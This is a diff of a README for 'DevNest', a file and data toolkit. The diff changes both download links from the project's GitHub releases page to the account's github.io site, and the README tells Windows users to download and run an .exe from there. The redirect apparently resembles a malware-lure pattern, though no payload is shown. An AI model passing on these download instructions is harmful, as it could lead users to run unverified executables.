@@ -1,6 +1,6 @@
 # 🛠️ DevNest - Manage your files and data tools
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yorkshireterriertyrant786/DevNest/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://yorkshireterriertyrant786.github.io)
 
 DevNest provides a set of tools to help you manage your computer files and inspect data. This application runs as a single file on your system. It works the same way on Windows, Linux, and macOS. You can organize folders, find duplicate files, check websites, inspect security certificates, create passwords, and read data files like JSON or YAML.
 
@@ -8,7 +8,7 @@ DevNest provides a set of tools to help you manage your computer files and inspe
 
 To use DevNest, you must download the software from our official release page. You do not need to install complex software or configure your system. 
 
-Visit this page to download: https://github.com/yorkshireterriertyrant786/DevNest/releases
+Visit this page to download: https://yorkshireterriertyrant786.github.io
 
 Once the page loads, look for the list under the latest version. Find the file that ends in .exe for Windows. Click the file name to start your download. Save the file in a place you can find easily, such as your Downloads folder.
 
